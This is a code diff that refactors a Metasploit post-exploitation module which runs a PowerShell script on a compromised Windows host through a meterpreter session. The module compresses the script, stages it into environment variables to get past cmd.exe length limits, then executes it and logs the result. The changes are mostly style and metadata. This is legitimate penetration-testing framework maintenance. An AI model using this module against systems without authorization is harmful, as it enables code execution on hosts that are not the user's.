@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,49 +14,60 @@
 
 require 'zlib' # TODO: check if this can be done with REX
 
-require 'msf/core'
-require 'rex'
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Powershell
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'                 => "Windows Manage PowerShell Download and/or Execute",
-      'Description'          => %q{
-        This module will download and execute a PowerShell script over a meterpreter session.
-        The user may also enter text substitutions to be made in memory before execution.
-        Setting VERBOSE to true will output both the script prior to execution and the results.
-      },
-      'License'              => MSF_LICENSE,
-      'Platform'             => ['win'],
-      'SessionTypes'         => ['meterpreter'],
-      'Author'               => [
-        'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
-        'RageLtMan' # post module
-        ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage PowerShell Download and/or Execute',
+        'Description' => %q{
+          This module will download and execute a PowerShell script over a meterpreter session.
+          The user may also enter text substitutions to be made in memory before execution.
+          Setting VERBOSE to true will output both the script prior to execution and the results.
+        },
+        'License' => MSF_LICENSE,
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Author' => [
+          'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
+          'RageLtMan <rageltman[at]sempervictus>' # post module
+        ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_config_sysinfo
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
-        OptPath.new( 'SCRIPT',  [true, 'Path to the local PS script', ::File.join(Msf::Config.install_root, "scripts", "ps", "msflag.ps1") ]),
-      ], self.class)
+        OptPath.new('SCRIPT', [true, 'Path to the local PS script', ::File.join(Msf::Config.data_directory, 'post', 'powershell', 'msflag.ps1') ]),
+      ]
+    )
 
     register_advanced_options(
       [
         OptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub format - original,sub;original,sub' ]),
-        OptBool.new(  'DELETE',        [false, 'Delete file after execution', false ]),
-        OptBool.new(  'DRY_RUN',        [false, 'Only show what would be done', false ]),
-        OptInt.new('TIMEOUT',   [false, 'Execution timeout', 15]),
-      ], self.class)
-
+        OptBool.new('DELETE', [false, 'Delete file after execution', false ]),
+        OptBool.new('DRY_RUN', [false, 'Only show what would be done', false ]),
+        OptInt.new('TIMEOUT', [false, 'Execution timeout', 15]),
+      ]
+    )
   end
 
   def run
-
-    # Make sure we meet the requirements before running the script, note no need to return
-    # unless error
-    return 0 if ! (session.type == "meterpreter" || have_powershell?)
+    fail_with(Failure::BadConfig, 'This module requires a Meterpreter session') unless session.type == 'meterpreter'
+    fail_with(Failure::BadConfig, 'PowerShell is not installed') unless have_powershell?
 
     # End of file marker
     eof = Rex::Text.rand_text_alpha(8)
@@ -74,14 +85,14 @@ class MetasploitModule < Msf::Post
     computer_name = session.sys.config.sysinfo['Computer']
 
     # Create unique log directory
-    log_dir = ::File.join(Msf::Config.log_directory,'scripts', computer_name)
+    log_dir = ::File.join(Msf::Config.log_directory, 'scripts', computer_name)
     ::FileUtils.mkdir_p(log_dir)
 
     # Define log filename
-    script_ext  = ::File.extname(datastore['SCRIPT'])
+    script_ext = ::File.extname(datastore['SCRIPT'])
     script_base = ::File.basename(datastore['SCRIPT'], script_ext)
-    time_stamp  = ::Time.now.strftime('%Y%m%d:%H%M%S')
-    log_file    = ::File.join(log_dir,"#{script_base}-#{time_stamp}.txt")
+    time_stamp = ::Time.now.strftime('%Y%m%d:%H%M%S')
+    log_file = ::File.join(log_dir, "#{script_base}-#{time_stamp}.txt")
 
     # Compress
     print_status('Compressing script contents.')
@@ -94,12 +105,12 @@ class MetasploitModule < Msf::Post
     # If the compressed size is > 8100 bytes, launch stager
     if (compressed_script.size > 8100)
       print_error("Compressed size: #{compressed_script.size}")
-      error_msg =  "Compressed size may cause command to exceed "
+      error_msg = 'Compressed size may cause command to exceed '
       error_msg += "cmd.exe's 8kB character limit."
       print_error(error_msg)
       print_status('Launching stager:')
       script = stage_to_env(compressed_script, env_suffix)
-      print_good("Payload successfully staged.")
+      print_good('Payload successfully staged.')
     else
       print_good("Compressed size: #{compressed_script.size}")
       script = compressed_script
@@ -120,6 +131,4 @@ class MetasploitModule < Msf::Post
     # That's it
     print_good('Finished!')
   end
-
 end
-
